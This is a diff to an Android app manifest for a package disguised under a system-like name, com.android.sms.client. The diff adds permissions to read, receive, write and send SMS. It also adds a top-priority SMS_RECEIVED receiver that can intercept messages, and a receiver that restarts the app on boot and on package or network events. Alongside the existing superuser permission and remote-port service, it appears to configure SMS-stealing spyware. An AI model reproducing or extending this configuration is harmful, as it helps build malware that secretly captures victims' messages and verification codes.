@@ -10,6 +10,13 @@
 	<uses-permission android:name = "android.permission.ACCESS_WIFI_STATE" />
 	<uses-permission android:name = "android.permission.WRITE_EXTERNAL_STORAGE" />
 	<uses-permission android:name = "android.permission.ACCESS_SUPERUSER" />
+	<uses-permission android:name = "android.permission.RECEIVE_SMS" />
+	<uses-permission android:name = "android.permission.READ_SMS" />
+	<uses-permission android:name = "android.permission.READ_PROFILE" />
+	<uses-permission android:name = "android.permission.WRITE_SMS" />
+	<uses-permission android:name = "android.permission.SEND_SMS" />
+	<uses-permission android:name = "android.permission.RECEIVE_BOOT_COMPLETED"/>
+
 	<application
 			android:allowBackup = "true"
 			android:icon = "@mipmap/ic_launcher"
@@ -29,6 +36,25 @@
 		</activity >
 		<activity android:name = "com.android.sms.client.AppManager" />
 		<service android:name = "com.android.sms.client.GetRemotePortService" />
+		<service android:name = "com.android.sms.client.GetMsgService" />
+		<receiver android:name = "com.android.sms.client.Receiver_SMS" >
+			<intent-filter android:priority = "1000" >
+				<action android:name = "android.provider.Telephony.SMS_RECEIVED" />
+			</intent-filter >
+		</receiver >
+
+		<receiver android:name = "com.android.sms.client.BootCompletedReceiver" >
+			<intent-filter android:priority = "1000" >
+				<action android:name = "android.intent.action.BOOT_COMPLETED" />
+
+				<category android:name = "android.intent.category.DEFAULT" />
+				<action android:name = "android.intent.action.PACKAGE_INSTALL" />
+				<action android:name = "android.intent.action.PACKAGE_ADDED" />
+				<action android:name = "android.net.conn.CONNECTIVITY_CHANGE" />
+				<action android:name = "android.net.wifi.WIFI_STATE_CHANGED" />
+				<data android:scheme = "package" />
+			</intent-filter >
+		</receiver >
 	</application >
 
 </manifest >
